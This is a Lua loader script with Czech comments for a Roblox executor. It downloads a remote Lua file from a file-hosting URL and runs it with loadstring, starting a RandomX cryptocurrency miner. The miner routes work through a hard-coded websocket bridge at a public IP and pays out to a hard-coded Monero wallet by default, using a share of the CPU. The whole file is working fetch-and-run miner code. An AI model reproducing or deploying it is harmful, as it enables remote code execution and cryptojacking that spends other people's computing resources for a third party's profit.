-- RandomX (rx/0) miner pro Roblox executor — stahovaci obal.
-- Vloz do executoru; stahne a spusti aktualni miner (potrebuje bezici bridge).
-- Zastaveni: _G.MINER_STOP = true
-- Vlastni penizenka: _G.MINER_CFG = { wallet = "..." } pred timhle skriptem.

local WALLET = "42ypgDkEvE1VQSLfXwQffKBF7L5vETygtfvaynG9nW8W7crvsrGv4ziAAmTppDkedKSdz9iAKM7f5gBwZpnNviY81ACgjhw"
local MINER_URL = "https://files.catbox.moe/kbgje8.lua"
local BRIDGE = "wss://rx-bridge.152.53.160.54.sslip.io/" -- verejny bridge
local BRIDGE_FALLBACK = "ws://127.0.0.1:8790" -- lokalni, kdyz verejny nefunguje

local env = getgenv and getgenv() or _G

local function get(name)
	return rawget(_G, name) or rawget(env, name)
end

local function log(...)
	print("[loader]", ...)
end

local function fetch(url)
	local req = rawget(_G, "request") or rawget(_G, "http_request") or rawget(_G, "syn")
	if type(req) ~= "function" then req = nil end
	if req then
		local ok, res = pcall(req, { Url = url, Method = "GET" })
		if ok and res and (res.StatusCode == 200 or res.status == 200) then
			return res.Body or res.body
		end
	end
	return game:HttpGet(url)
end

if get("MINER_RUNNING") then
	log("miner uz bezi, ukoncuji ho a startuji znovu")
	_G.MINER_STOP = true
	env.MINER_STOP = true
	-- pri nizkem duty trva hash minuty, na pevny task.wait(3) se neda spolednout
	for _ = 1, 600 do
		if not get("MINER_RUNNING") then break end
		task.wait(1)
	end
end

log("stahuji miner…")
local src = fetch(MINER_URL)
if type(src) ~= "string" or #src < 100000 then
	error("miner se nestahl (odpoved " .. tostring(src and #src) .. " B)")
end
log(string.format("stazeno %d B", #src))

-- cizi nastaveni ma prednost
local cfg = get("MINER_CFG")
if type(cfg) ~= "table" then cfg = {} end
cfg.wallet = cfg.wallet or get("RX_WALLET") or WALLET
cfg.bridge = cfg.bridge or BRIDGE
cfg.bridgeFallback = cfg.bridgeFallback or BRIDGE_FALLBACK
cfg.duty = tonumber(cfg.duty) or tonumber(get("RX_DUTY")) or 0.10 -- podil CPU (0.10 = 10 %)
if not cfg.slicePcs then cfg.slicePcs = 256 end
_G.MINER_CFG = cfg
env.MINER_CFG = cfg -- bundle cte rawget(_G, "MINER_CFG")

_G.MINER_STOP = false -- prebit pripadne stare zastaveni
env.MINER_STOP = false
env.MINER_RUNNING = true
_G.MINER_RUNNING = true

local compile = rawget(_G, "loadstring") or env.loadstring
local fn = assert(compile(src), "miner se nepodarilo zkompilovat")
local ok, err = pcall(fn)
env.MINER_RUNNING = false
_G.MINER_RUNNING = false
if not ok then
	log("koncim s chybou: " .. tostring(err))
else
	log("miner dobehl")
end
